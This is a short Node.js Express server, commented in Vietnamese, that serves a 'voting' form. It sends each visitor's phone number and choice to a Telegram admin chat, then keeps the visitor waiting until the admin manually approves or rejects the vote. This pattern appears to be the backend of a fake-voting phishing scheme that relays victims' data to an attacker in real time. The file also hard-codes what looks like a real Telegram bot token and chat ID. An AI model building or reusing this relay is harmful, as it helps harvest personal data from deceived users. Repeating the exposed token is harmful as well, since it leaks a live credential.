
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
const BOT_TOKEN = "7653645214:AAF2HEycMb87XwMtysljzWp0lhuI0WgCbg0"; // thay bằng token bot thật
const ADMIN_CHAT_ID = "6030982150"; // thay bằng chat_id Telegram admin

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const pendingVotes = {};

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("Bot bình chọn đang hoạt động...");
});

app.get("/vote", (req, res) => {
  res.sendFile(__dirname + "/form.html");
});

app.post("/submit", async (req, res) => {
  const { phone, choice } = req.body;
  const voteId = `${phone}_${Date.now()}`;
  pendingVotes[voteId] = res;

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: ADMIN_CHAT_ID,
    text: `Bình chọn mới:
Số điện thoại: ${phone}
Lựa chọn: ${choice}

Trả lời: ${voteId} có hoặc không`
  });
});

app.post("/", async (req, res) => {
  const message = req.body.message;
  if (message && message.text && message.chat.id == ADMIN_CHAT_ID) {
    const [voteId, response] = message.text.trim().split(" ");
    const voteRes = pendingVotes[voteId];

    if (voteRes) {
      if (response.toLowerCase() === "có") {
        voteRes.send("Bình chọn thành công!");
      } else {
        voteRes.send("Bình chọn không hợp lệ, vui lòng thử lại!");
      }
      delete pendingVotes[voteId];
    }
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server chạy cổng", PORT);
});
